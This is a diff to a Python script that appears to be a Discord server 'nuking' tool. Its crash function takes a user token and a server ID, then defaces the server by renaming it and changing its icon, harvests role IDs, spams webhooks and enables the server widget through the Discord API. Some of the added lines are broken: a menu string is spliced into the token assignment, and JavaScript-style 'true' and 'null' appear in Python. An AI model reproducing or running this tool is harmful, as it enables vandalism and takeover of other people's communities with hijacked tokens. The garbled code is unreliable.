@@ -472,7 +472,8 @@ def crash(jsonHook, defaultMessage, nameHooks, icons, icon, statuses):
 			info5 = {'content':defaultMessage,'username':nameHooks,'avatar_url':icons}
 			deface = {'name': 'C.A.S', 'verification_level': None, 'icon': icon}
 			x = 1
-			token = input('\nToken: ')
+			token =glitchMenu = '''\n[1] - Glitcher
+[2] - Help.''' input('\nToken: ')
 			serverID = input('\nServer ID: ')
 			headers = {'Authorization': token}
 			headers2 = {'Content-Type': 'application/json', 'Authorization': token}
@@ -491,6 +492,7 @@ def crash(jsonHook, defaultMessage, nameHooks, icons, icon, statuses):
 					roleIds.append(iD['id'])
 			else:
 				errorLog.write(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {request.status_code}] [Message: {request.json()}\n")
+			req = requests.patch(f'https://discord.com/api/v9/guilds/{serverID}/widget', headers=headers, json={'enabled': true, 'channel_id': null})
 			req = requests.patch(f'https://discord.com/api/v8/guilds/{serverID}', headers=headers, json=deface)
 			if req.status_code not in statuses:
 				errorLog.write(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n")
@@ -1303,7 +1305,7 @@ def glitch(statusName):
 	sessionName = 'Glitcher'
 	errorLog = open('errorlogs.txt', 'a+')
 	print(exitMenu)
-	print(gitchMenu)
+	print(glitchMenu)
 	try:
 		select = str(input('\nSelect: '))
 		if select == '1':
